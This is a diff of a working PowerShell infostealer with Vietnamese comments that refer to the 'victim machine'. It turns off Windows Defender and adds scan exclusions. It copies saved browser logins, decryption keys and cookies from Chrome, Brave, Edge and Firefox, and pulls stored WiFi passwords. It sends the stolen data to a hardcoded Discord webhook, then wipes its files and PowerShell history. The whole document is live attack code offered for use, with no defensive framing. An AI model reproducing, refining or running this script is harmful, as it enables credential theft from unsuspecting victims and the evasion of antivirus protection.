@@ -2,125 +2,56 @@
 
 $WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'
 
-# Thu muc tam tren may nan nhan
+# Su dung thu muc tam tren may nan nhan (thay vi USB)
 $destDir = "$env:TEMP\Exfil_$env:USERNAME"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir -Force
 }
 
-# Tao thu muc con
-$sysInfoDir = "$destDir\SystemInfo"
-New-Item -ItemType Directory -Path $sysInfoDir -Force
+# Tao thu muc con cho browser data
+$browserDir = "$destDir\BrowserData"
+if (-Not (Test-Path $browserDir)) {
+    New-Item -ItemType Directory -Path $browserDir -Force
+}
 
 # Tat Windows Defender
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-} catch {}
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "$env:TEMP\" -ErrorAction SilentlyContinue
+Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
 
 # ==========================================
-# DISCORD WEBHOOK FUNCTION - GUI TEXT
+# DISCORD WEBHOOK FUNCTION
 # ==========================================
 function Send-DiscordText {
     param([string]$Title, [string]$Content)
-    
-    if ([string]::IsNullOrWhiteSpace($Content)) {
-        Write-Host "[-] No content for: $Title"
-        return
-    }
-    
-    # Discord gioi han 2000 ky tu moi message
-    if ($Content.Length -gt 1900) {
-        $Content = $Content.Substring(0, 1900) + "...`n[TRUNCATED]"
-    }
-    
-    $payload = @{
-        content = "**[$Title]**`n```$Content```"
-    } | ConvertTo-Json
-    
-    try {
-        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
-        Write-Host "[+] Sent: $Title"
-    } catch {
-        Write-Host "[-] Failed to send: $Title - $_"
-    }
-}
-
-# Ham gui nhieu phan (neu noi dung dai)
-function Send-DiscordLongText {
-    param([string]$Title, [string]$Content, [int]$MaxLength = 1900)
-    
     if ([string]::IsNullOrWhiteSpace($Content)) { return }
-    
-    if ($Content.Length -le $MaxLength) {
-        Send-DiscordText $Title $Content
-        return
-    }
-    
-    # Chia nho noi dung
-    $parts = [math]::Ceiling($Content.Length / $MaxLength)
-    for ($i = 0; $i -lt $parts; $i++) {
-        $start = $i * $MaxLength
-        $length = [Math]::Min($MaxLength, $Content.Length - $start)
-        $partContent = $Content.Substring($start, $length)
-        $partTitle = "$Title (Part $($i+1)/$parts)"
-        Send-DiscordText $partTitle $partContent
-        Start-Sleep -Milliseconds 500
-    }
+    if ($Content.Length -gt 1900) { $Content = $Content.Substring(0, 1900) + "...[TRUNCATED]" }
+    $payload = @{ content = "[$Title]`n```$Content```" } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+        Write-Host "[+] Sent: $Title"
+    } catch {}
 }
 
 # Function to copy browser files
-function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
-    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
-    if (-Not (Test-Path $browserDir)) {
-        Write-Host "$browserName - Directory not found"
-        return
+function CopyBrowserFiles($browserName, $browserDirPath, $filesToCopy) {
+    $browserDestDir = Join-Path -Path $browserDir -ChildPath $browserName
+    if (-Not (Test-Path $browserDestDir)) {
+        New-Item -ItemType Directory -Path $browserDestDir -Force
     }
-    
-    New-Item -ItemType Directory -Path $browserDestDir -Force | Out-Null
 
     foreach ($file in $filesToCopy) {
-        $source = Join-Path -Path $browserDir -ChildPath $file
+        $source = Join-Path -Path $browserDirPath -ChildPath $file
         if (Test-Path $source) {
             try {
                 Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
-                Write-Host "$browserName - Copied: $file"
+                Write-Host "$browserName - File copied: $file"
             } catch {
-                try {
-                    [System.IO.File]::Copy($source, (Join-Path $browserDestDir $file), $true)
-                    Write-Host "$browserName - Copied (alternative): $file"
-                } catch {
-                    Write-Host "$browserName - Failed to copy: $file"
-                }
+                Write-Host "$browserName - Failed to copy: $file (file may be locked)"
             }
         } else {
-            Write-Host "$browserName - Not found: $file"
+            Write-Host "$browserName - File not found: $file"
         }
-    }
-}
-
-# Ham doc file va tra ve noi dung (xu ly file nhi phan)
-function Get-FileContentAsText {
-    param([string]$FilePath)
-    
-    if (-not (Test-Path $FilePath)) { return $null }
-    
-    try {
-        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
-        # Chi lay 5000 bytes dau de tranh qua dai
-        if ($bytes.Length -gt 5000) {
-            $bytes = $bytes[0..4999]
-            $isTruncated = $true
-        } else {
-            $isTruncated = $false
-        }
-        
-        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
-        if ($isTruncated) {
-            $text += "`n[FILE TRUNCATED - Original size: $([math]::Round((Get-Item $FilePath).Length/1KB, 2)) KB]"
-        }
-        return $text
-    } catch {
-        return "[Cannot read file: $_]"
     }
 }
 
@@ -132,8 +63,11 @@ if (Test-Path $chromeDir) {
     CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
     $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     if (Test-Path $localState) {
-        Copy-Item $localState "$destDir\Chrome\" -Force -ErrorAction SilentlyContinue
+        Copy-Item $localState "$browserDir\Chrome\" -Force -ErrorAction SilentlyContinue
+        Write-Host "Chrome - Local State copied"
     }
+} else {
+    Write-Host "Chrome - Not installed"
 }
 
 # ==========================================
@@ -144,19 +78,28 @@ if (Test-Path $braveDir) {
     CopyBrowserFiles "Brave" $braveDir @("Login Data")
     $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
     if (Test-Path $localState) {
-        Copy-Item $localState "$destDir\Brave\" -Force -ErrorAction SilentlyContinue
+        Copy-Item $localState "$browserDir\Brave\" -Force -ErrorAction SilentlyContinue
+        Write-Host "Brave - Local State copied"
     }
+} else {
+    Write-Host "Brave - Not installed"
 }
 
 # ==========================================
 # 3. FIREFOX
 # ==========================================
-$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $firefoxProfiles) {
-    $firefoxProfile = Get-ChildItem -Path $firefoxProfiles -Filter "*.default*" | Select-Object -First 1
+$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
+if (Test-Path $firefoxProfileDir) {
+    $firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default*" | Select-Object -First 1
     if ($firefoxProfile) {
-        CopyBrowserFiles "Firefox" $firefoxProfile.FullName @("logins.json", "key4.db", "cookies.sqlite")
+        $firefoxDir = $firefoxProfile.FullName
+        $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
+        CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
+    } else {
+        Write-Host "Firefox - No profile found"
     }
+} else {
+    Write-Host "Firefox - Not installed"
 }
 
 # ==========================================
@@ -167,29 +110,37 @@ if (Test-Path $edgeDir) {
     CopyBrowserFiles "Edge" $edgeDir @("Login Data")
     $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
     if (Test-Path $localState) {
-        Copy-Item $localState "$destDir\Edge\" -Force -ErrorAction SilentlyContinue
+        Copy-Item $localState "$browserDir\Edge\" -Force -ErrorAction SilentlyContinue
+        Write-Host "Edge - Local State copied"
     }
+} else {
+    Write-Host "Edge - Not installed"
 }
 
 # ==========================================
 # 5. SYSTEM INFORMATION
 # ==========================================
 Write-Host "[+] Gathering system information..."
+$sysInfoDir = "$destDir\SystemInfo"
+New-Item -ItemType Directory -Path $sysInfoDir -Force
+
 Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
 Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
 Get-Service | Out-File "$sysInfoDir\service_list.txt" -ErrorAction SilentlyContinue
 Get-NetIPAddress | Out-File "$sysInfoDir\network_config.txt" -ErrorAction SilentlyContinue
 Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue
 
+Write-Host "[+] System information gathered"
+
 # ==========================================
 # 6. WIFI PASSWORDS
 # ==========================================
 Write-Host "[+] Extracting WiFi passwords..."
 $wifiFile = "$destDir\WiFi_Details.txt"
-"="*60 | Out-File $wifiFile
+"============================================================" | Out-File $wifiFile
 "WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
 "Extracted: $(Get-Date)" | Out-File $wifiFile -Append
-"="*60 | Out-File $wifiFile -Append
+"============================================================" | Out-File $wifiFile -Append
 "" | Out-File $wifiFile -Append
 
 $wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
@@ -199,91 +150,75 @@ foreach ($profile in $wifiProfiles) {
     if (-not $keyContent) { $keyContent = "No password (Open network)" }
     "$profile : $keyContent" | Out-File $wifiFile -Append
 }
+Write-Host "[+] WiFi passwords extracted"
 
 # ==========================================
-# 7. GUI DU LIEU QUA DISCORD (DANG TEXT)
+# 7. SEND DATA TO DISCORD
 # ==========================================
 Write-Host "[+] Sending data to Discord..."
 
-# Gui thong bao bat dau
-Send-DiscordText "TARGET INFORMATION" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"
+# Gui thong tin target
+Send-DiscordText "TARGET INFO" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"
 
 # Gui WiFi passwords
 $wifiContent = Get-Content $wifiFile -Raw -ErrorAction SilentlyContinue
 if ($wifiContent) {
-    Send-DiscordLongText "WiFi Passwords" $wifiContent
-} else {
-    Send-DiscordText "WiFi Passwords" "No WiFi profiles found"
+    Send-DiscordText "WIFI PASSWORDS" $wifiContent
 }
 
-# Gui Computer Info
+# Gui System Info
 $computerInfo = Get-Content "$sysInfoDir\computer_info.txt" -Raw -ErrorAction SilentlyContinue
-if ($computerInfo) {
-    Send-DiscordLongText "Computer Information" $computerInfo
-}
+if ($computerInfo) { Send-DiscordText "SYSTEM INFO" $computerInfo }
 
-# Gui Local Users
 $localUsers = Get-Content "$sysInfoDir\local_users.txt" -Raw -ErrorAction SilentlyContinue
-if ($localUsers) {
-    Send-DiscordLongText "Local Users" $localUsers
-}
+if ($localUsers) { Send-DiscordText "LOCAL USERS" $localUsers }
 
-# Gui Network Config
-$networkConfig = Get-Content "$sysInfoDir\network_config.txt" -Raw -ErrorAction SilentlyContinue
-if ($networkConfig) {
-    Send-DiscordLongText "Network Configuration" $networkConfig
-}
-
-# Gui Process List (tom tat)
-$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 30 | Out-String
-Send-DiscordText "Top 30 Processes by CPU" $processes
+$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 20 | Out-String
+Send-DiscordText "TOP 20 PROCESSES" $processes
 
 # Gui browser credentials
 $browsers = @("Chrome", "Brave", "Edge", "Firefox")
 foreach ($browser in $browsers) {
-    $browserDir = "$destDir\$browser"
-    if (Test-Path $browserDir) {
-        $loginDataFile = "$browserDir\Login Data"
+    $browserDataDir = "$browserDir\$browser"
+    if (Test-Path $browserDataDir) {
+        $loginDataFile = "$browserDataDir\Login Data"
         if (Test-Path $loginDataFile) {
-            $content = Get-FileContentAsText $loginDataFile
-            Send-DiscordLongText "$browser - Login Data (Raw)" $content
-        }
-        
-        $localStateFile = "$browserDir\Local State"
-        if (Test-Path $localStateFile) {
-            $content = Get-FileContentAsText $localStateFile
-            Send-DiscordLongText "$browser - Local State (Decryption Key)" $content
+            $bytes = [System.IO.File]::ReadAllBytes($loginDataFile)
+            if ($bytes.Length -gt 3000) { $bytes = $bytes[0..2999] }
+            $content = [System.Text.Encoding]::UTF8.GetString($bytes)
+            Send-DiscordText "$browser - LOGIN DATA" $content
         }
         
         # Firefox specific
-        $loginsJson = "$browserDir\logins.json"
+        $loginsJson = "$browserDataDir\logins.json"
         if (Test-Path $loginsJson) {
-            $content = Get-FileContentAsText $loginsJson
-            Send-DiscordLongText "Firefox - logins.json" $content
-        }
-        
-        $key4db = "$browserDir\key4.db"
-        if (Test-Path $key4db) {
-            $content = Get-FileContentAsText $key4db
-            Send-DiscordLongText "Firefox - key4.db (Partial)" $content
+            $content = Get-Content $loginsJson -Raw -ErrorAction SilentlyContinue
+            if ($content.Length -gt 1900) { $content = $content.Substring(0, 1900) }
+            Send-DiscordText "Firefox - LOGINS.JSON" $content
         }
     }
 }
 
 # Gui thong bao hoan tat
-Send-DiscordText "EXFILTRATION COMPLETED" "Target: $env:COMPUTERNAME`nUser: $env:USERNAME`nCompleted: $(Get-Date)"
+Send-DiscordText "COMPLETED" "Exfiltration finished at $(Get-Date)"
 
 # ==========================================
-# 8. DON DEP
+# 8. CLEANUP
 # ==========================================
 Write-Host "[+] Cleaning up..."
+
+# Xoa tat ca file tam
 Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# Xoa lich su PowerShell
 Clear-History
-$historyPath = (Get-PSReadLineOption).HistorySavePath
+$historyPath = (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 if ($historyPath -and (Test-Path $historyPath)) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "[+] Done!"
+# Bat lai Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 
+Write-Host "[+] Done!"
 exit
